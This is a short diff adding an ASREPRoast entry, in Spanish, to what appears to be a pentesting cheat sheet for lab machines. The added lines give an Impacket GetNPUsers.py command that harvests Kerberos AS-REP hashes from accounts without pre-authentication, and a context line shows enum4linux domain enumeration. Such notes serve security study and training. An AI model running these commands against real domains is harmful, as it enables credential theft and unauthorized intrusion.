@@ -206,3 +206,8 @@ Ahora el proceso es muy similar para obtener las columnas y los datos de las col
 
 `enum4linux -a -u "user" -p "password" <DC IP>` # Enumeramos con enum4linux
 
+**ASREPRoast**
+
+*El ataque ASREPRoast busca usuarios sin el atributo requerido de autenticación previa de Kerberos (DONT_REQ_PREAUTH)*
+
+`python3 GetNPUsers.py domain.htb/ -usersfile usernames.txt -outputfile hashes.asreproast`
